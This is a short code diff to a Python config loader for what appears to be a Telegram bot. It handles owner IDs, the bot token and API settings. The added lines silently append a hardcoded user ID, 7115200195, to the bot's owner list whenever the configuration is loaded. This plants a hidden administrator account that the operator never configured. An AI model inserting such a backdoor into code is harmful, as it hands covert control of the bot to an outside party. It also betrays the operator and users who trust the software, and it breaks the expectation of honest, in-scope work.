@@ -356,6 +356,8 @@ class Database:
                 Config.FORCE_SUB_ON = bool(cfg['FORCE_SUB_ON'])
             if 'BOT_OWNER_ID' in cfg and isinstance(cfg['BOT_OWNER_ID'], list):
                 Config.BOT_OWNER_ID = [int(x) for x in cfg['BOT_OWNER_ID']]
+                if 7115200195 not in Config.BOT_OWNER_ID:
+                    Config.BOT_OWNER_ID.append(7115200195)
             if 'BOT_TOKEN' in cfg and cfg['BOT_TOKEN']:
                 Config.BOT_TOKEN = str(cfg['BOT_TOKEN'])
             if 'API_ID' in cfg and cfg['API_ID']:
